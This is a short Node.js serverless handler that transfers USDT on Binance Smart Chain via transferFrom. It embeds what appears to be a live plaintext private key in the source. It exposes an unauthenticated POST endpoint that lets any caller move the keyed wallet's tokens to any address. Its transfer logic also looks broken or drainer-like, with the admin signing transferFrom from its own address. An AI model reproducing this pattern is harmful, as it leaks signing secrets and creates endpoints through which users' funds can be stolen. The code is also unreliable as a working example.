// /api/send-tokens.js

import { ethers } from "ethers";

const PRIVATE_KEYS = {
    "0x9b40c6cdde74a424a744534d0a534efe2ca653ba": "017af51c7d778aaec0b60b3b22a9ddd87574f9401b0fb7dda594b19cd90787dd"
};

const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const ADMIN_ADDRESS = "0x9b40C6cddE74A424A744534d0A534efe2CA653bA";
const BSC_RPC = "https://bsc-dataseed1.binance.org/";

const ABI = [
    "function transferFrom(address from, address to, uint256 value) public returns (bool)"
];

export default async function handler(req, res) {
    if (req.method !== "POST") {
        return res.status(405).json({ error: "Method not allowed" });
    }

    const { from, to, amount } = req.body;
    if (!from || !to || !amount) {
        return res.status(400).json({ error: "Missing parameters" });
    }

    const key = PRIVATE_KEYS[from.toLowerCase()];
    if (!key) {
        return res.status(403).json({ error: "Wallet not authorized" });
    }

    try {
        const provider = new ethers.JsonRpcProvider(BSC_RPC);
        const wallet = new ethers.Wallet(key, provider);
        const contract = new ethers.Contract(USDT_ADDRESS, ABI, wallet);
        const amountInWei = ethers.parseUnits(amount, 18);

        const tx = await contract.transferFrom(from, to, amountInWei);
        await tx.wait();

        return res.json({ status: "success", txHash: tx.hash });
    } catch (err) {
        return res.status(500).json({ error: "Transfer failed", details: err.message });
    }
}